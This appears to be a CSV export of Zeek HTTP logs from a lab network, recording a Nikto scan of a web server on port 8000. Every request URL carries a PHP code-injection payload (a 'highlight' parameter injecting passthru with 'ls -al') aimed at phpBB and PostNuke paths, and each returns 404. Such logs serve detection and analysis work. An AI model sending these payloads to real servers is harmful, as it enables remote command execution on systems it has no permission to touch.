"@timestamp","_id","_ignored","_index","_score","agent.ephemeral_id","agent.id","agent.name","agent.name.text","agent.type","agent.version","data_stream.dataset","data_stream.namespace","data_stream.type","destination.address","destination.ip","destination.port","ecs.version","elastic_agent.id","elastic_agent.snapshot","elastic_agent.version","event.action","event.agent_id_status","event.category","event.created","event.dataset","event.id","event.ingested","event.kind","event.module","event.outcome","event.type","http.request.body.bytes","http.request.method","http.response.body.bytes","http.response.status_code","http.version","input.type","log.file.path","log.offset","network.community_id","network.transport","related.ip","source.address","source.ip","source.port",tags,"url.domain","url.extension","url.original","url.original.text","url.path","url.query","user_agent.device.name","user_agent.name","user_agent.original","user_agent.original.text","user_agent.os.full","user_agent.os.full.text","user_agent.os.name","user_agent.os.name.text","user_agent.os.version","user_agent.version","zeek.http.orig_fuids","zeek.http.orig_mime_types","zeek.http.resp_fuids","zeek.http.resp_mime_types","zeek.http.status_msg","zeek.http.trans_depth","zeek.session_id"
"Mar 7, 2025 @ 18:08:36.062",UfPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.985","zeek.http",C2R41q35NuSt9kKws6,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,070,897","1:vfopCgwePT1lx+xaZbHzOThLooA=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,514","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FR5h5b3aLng6oKBYa3,"text/html","File not found",1,C2R41q35NuSt9kKws6
"Mar 7, 2025 @ 18:08:36.056",UPPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.985","zeek.http",CC41tx3sOHfs4PRA07,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,070,262","1:Rm2DjyPM+a1ihU1UyIEndtHGEFE=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,500","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",Fyj2KtY4736u6Eyse,"text/html","File not found",1,CC41tx3sOHfs4PRA07
"Mar 7, 2025 @ 18:08:36.047","T_PecpUBaT9JHWGjN8br","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.985","zeek.http",CkY5fn2ESwXn72Emw1,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,069,625","1:qmsoKQbGUm5URuK9/p25vr6pPmk=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,494","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FZu392WkhoQJRBGLg,"text/html","File not found",1,CkY5fn2ESwXn72Emw1
"Mar 7, 2025 @ 18:08:36.041",TvPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.985","zeek.http",CECTat3UivPU771Bf1,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,068,981","1:FZGQ9ckFZxZASeWUvCaoDpZQ41A=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,484","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FOGnGe1eKsGrjBBVbj,"text/html","File not found",1,CECTat3UivPU771Bf1
"Mar 7, 2025 @ 18:08:36.032",TfPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.985","zeek.http",CjZf5P2de0QOCDF3y2,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,068,342","1:qXMtUCnxQdpowpOGsrnOZxgbZtI=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,478","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",Fm2Ulk4hcNrJoj0Cne,"text/html","File not found",1,CjZf5P2de0QOCDF3y2
"Mar 7, 2025 @ 18:08:36.027",TPPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.985","zeek.http",CNgUwp4NwSYoHsgB64,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,067,712","1:IiaMooaZeK2cNhgTUA28+nkL4VM=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,462","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/index.php?Nikto=forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FImLwi1zKVIAIJSpml,"text/html","File not found",1,CNgUwp4NwSYoHsgB64
"Mar 7, 2025 @ 18:08:35.977","P_PecpUBaT9JHWGjN8br","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.984","zeek.http",C3njywEn28XRCsy9e,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,063,261","1:iqDES/iw1d0uUf4WFHKj4YLbEDs=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,422","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FDdwEy4ODzjVNwCY92,"text/html","File not found",1,C3njywEn28XRCsy9e
"Mar 7, 2025 @ 18:08:35.965",PvPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.984","zeek.http",CdZvfC3ZNE0yvZv1eh,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,062,625","1:+J0j8d5sKa7fZVPxZlGXRfp+nRk=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,416","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FRRfbE3W5fVx2PzQQf,"text/html","File not found",1,CdZvfC3ZNE0yvZv1eh
"Mar 7, 2025 @ 18:08:35.961",OvPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.984","zeek.http",Cz1ct835JrHwAJVsZ5,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,061,987","1:DMn6dTreqbsjIphlwaJNrLI5veg=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,404","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FPy6Gx2y7nIWfUCoL8,"text/html","File not found",1,Cz1ct835JrHwAJVsZ5
"Mar 7, 2025 @ 18:08:35.952",OPPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.984","zeek.http",CStaKt2W0V0Ba2hUU6,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,061,344","1:qEciWzQc1hkE9yDa32Rr025t0cM=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,400","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FNq3YY3NdDNCBwU6Ei,"text/html","File not found",1,CStaKt2W0V0Ba2hUU6
"Mar 7, 2025 @ 18:08:35.948","M_PecpUBaT9JHWGjN8br","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.984","zeek.http",ChxS2B3FTmKKcWPREl,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,060,705","1:rbemfzD0daaR8KMjg5bSTqDhovQ=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,396","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",Fxaw223BmmDBU3NZQ9,"text/html","File not found",1,ChxS2B3FTmKKcWPREl
"Mar 7, 2025 @ 18:08:35.938",MvPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.984","zeek.http",CKPIch4fDlIN9ajnUa,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,060,076","1:awzVxV/BCodld0rRio/GAo9eBuk=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,380","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FcNIm41R8jpUG3yBe1,"text/html","File not found",1,CKPIch4fDlIN9ajnUa
